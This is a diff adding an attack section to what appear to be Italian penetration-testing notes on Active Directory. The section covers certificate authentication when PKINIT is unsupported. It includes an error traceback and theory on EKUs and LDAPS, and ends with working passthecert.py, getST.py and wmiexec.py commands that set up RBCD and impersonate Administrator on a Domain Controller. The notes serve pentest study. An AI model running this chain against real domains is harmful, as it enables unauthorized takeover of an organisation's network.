@@ -10,6 +10,7 @@ Appunti, metodologia di penetration test per il rilevamento di anomalie, elenco 
 - [Attacco 4. Aggiunta nuovo computer in AD con LDAP signing not required and LDAP channel binding disabled](#Attacco-4-Aggiunta-nuovo-computer-in-AD-con-LDAP-signing-not-required-and-LDAP-channel-binding-disabled-)
 - [Attacco 5. Local Privilege Escalation KrbRelayUp Kerberos Relay Attack with RBCD method](#Attacco-5-Local-Privilege-Escalation-KrbRelayUp-Kerberos-Relay-Attack-with-RBCD-method-)
 - [Attacco 6. SMB Relay attacks using SCF and URL files](#Attacco-6-SMB-Relay-attacks-using-SCF-and-URL-files-)
+- [Attacco 7. Authenticating with certificates when pkinit is not supported](#Attacco-7-Authenticating-with-certificates-when-pkinit-is-not-supported-)
 ----------------
 ### Attacco 1. PetitPotam - NTLMv1 relay attack 🔐🕸🧑🏼‍💻
 
@@ -203,3 +204,90 @@ Durante un test di penetrazione interno, se scopri una condivisione di file sull
 ➤ SMB not signing
 
 #### Proof of Concept
+
+-----------------
+### Attacco 7. Authenticating with certificates when pkinit is not supported 🕸🧑🏼‍💻
+
+#### Teoria
+
+PKINIT è un meccanismo di Kerberos che consente di utilizzare i certificati X.509 come metodo di pre-autenticazione. Può essere utilizzato per richiedere un TGT e persino l'hash NT dell'account. 
+
+Di solito, quando una PKI è implementata in un ambiente Active Directory, PKINIT è supportato. Tuttavia, durante la mia valutazione, mi sono imbattuto nel seguente messaggio di errore quando cercavo di utilizzare un certificato del Controller di Dominio (ottenuto in modo malevolo):
+
+```
+$ python3 ~/tools/PKINITtools/gettgtpkinit.py -cert-pfx AD2_auth.pfx 'contoso.com/AD2$' AD2.ccache
+2022-04-07 12:49:00,854 minikerberos INFO     Caricamento del certificato e della chiave dal file
+2022-04-07 12:49:00,958 minikerberos INFO     Richiesta del TGT
+Traceback (most recent call last):
+  File "/home/yme/tools/PKINITtools/gettgtpkinit.py", line 349, in <module>
+    main()
+  File "/home/yme/tools/PKINITtools/gettgtpkinit.py", line 345, in main
+    amain(args)
+  File "/home/yme/tools/PKINITtools/gettgtpkinit.py", line 315, in amain
+    res = sock.sendrecv(req)
+  File "/home/yme/venv/PKINITtools/lib/python3.8/site-packages/minikerberos/network/clientsocket.py", line 87, in sendrecv
+    raise KerberosError(krb_message)
+minikerberos.protocol.errors.KerberosError:  Error Code: 16 Reason: KDC has no support for PADATA type (pre-authentication data)
+```
+
+**KDC_ERR_PADATA_TYPE_NOSUPP:**
+
+L'accesso tramite smart card è stato tentato e il certificato corretto non può essere trovato. Questo problema può verificarsi perché è stata interrogata l'autorità di certificazione (CA) sbagliata oppure perché non è possibile contattare la CA appropriata per ottenere i certificati del Controller di Dominio o dell'Autenticazione del Controller di Dominio per il controller di dominio.
+
+Può anche succedere quando un controller di dominio non ha installato un certificato per le smart card (modelli Domain Controller o Domain Controller Authentication).
+
+Un certificato può avere diversi Extended Key Usages (EKUs). Se un KDC deve supportare l'accesso tramite smart card, il suo certificato deve avere l'EKU per l'accesso tramite smart card. Un PKINIT che fallisce potrebbe indicare che i KDC mirati non dispongono di certificati con l'EKU necessario.
+
+Se ti trovi in questa situazione, non puoi utilizzare il tuo certificato per ottenere un TGT o un hash NT. Quindi, cosa puoi fare con il tuo certificato?
+Azioni Possibili con il Certificato
+
+Verifica dei Certificati e delle CA:
+        Controlla che il certificato utilizzato abbia tutti gli EKU necessari, in particolare l'EKU per l'accesso tramite smart card.
+        Assicurati che il certificato sia stato emesso dall'autorità di certificazione corretta e che questa sia accessibile e funzionante.
+
+Controllo dei Certificati sui Controller di Dominio:
+        Verifica che i controller di dominio abbiano installato i certificati appropriati, in particolare quelli per l'accesso tramite smart card.
+        Utilizza strumenti come certutil per esaminare i certificati installati sui controller di dominio.
+
+Utilizzo Alternativo del Certificato:
+        Anche se non puoi usare il certificato per ottenere un TGT o un hash NT, potrebbe essere utilizzabile per altre operazioni di autenticazione o crittografia all'interno della rete.
+        Puoi utilizzare il certificato per autenticarti ad altre risorse o servizi che accettano certificati X.509.
+
+Richiesta di Certificati Appropriati:
+        Se possibile, richiedi un certificato con gli EKU necessari tramite una CA interna che supporti PKINIT e l'accesso tramite smart card.
+
+Tuttavia:
+
+Active Directory consente due modalità per stabilire una connessione protetta SSL/TLS a un DC. 
+
+La prima è **collegandosi a un DC su una porta LDAPS protetta** (porte TCP 636 e 3269 in AD DS, e una porta specifica della configurazione in AD LDS). 
+
+La seconda è **collegandosi a un DC su una porta LDAP normale** (porte TCP 389 o 3268 in AD DS, e una porta specifica della configurazione in AD LDS), e successivamente inviando un'operazione estesa LDAP_SERVER_START_TLS_OID. 
+
+In entrambi i casi, il DC richiederà (ma non richiederà obbligatoriamente) il certificato del client come parte dell'handshake SSL/TLS. Se il client presenta un certificato valido al DC in quel momento, può essere utilizzato dal DC per autenticare (legare) la connessione come le credenziali rappresentate dal certificato.
+
+#### Prerequisiti
+
+➤ Certificato valido ottenuto ad esempio con ESC1
+
+➤ ms-DS-MachineAccountQuota ha bisogno di essere almeno a 1 (10 by default)
+
+#### Proof of Concept
+
+Creazione di un nuovo pc nel dominio
+```
+python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1
+```
+
+Aggiungere il SID di questo nuovo computer all'attributo msDS-AllowedToActOnBehalfOfOtherIdentity del tuo Controller di Dominio:
+```
+python3 passthecert.py --server ad1.contoso.com -crt user.crt -key user.key --rbcd --target "CN=AD2,OU=Domain Controllers,DC=contoso,DC=com" --sid "S-1-5-21-863927164-4106933278-53377030-3122"
+```
+
+Infine avvio di un attacco RBCD impersonificando Administrator sul Domain Controller
+```
+python3 getST.py -spn 'cifs/ad2.contoso.com' -impersonate Administrateur 'contoso.com/desktop-1337$:Q2cpNOMhwlU2yZQBPAbJ1YY9M9XJIfBc'
+
+export KRB5CCNAME=Administrateur.ccache
+wmiexec.py -k -no-pass contoso.com/Administrateur@ad2.contoso.com
+```
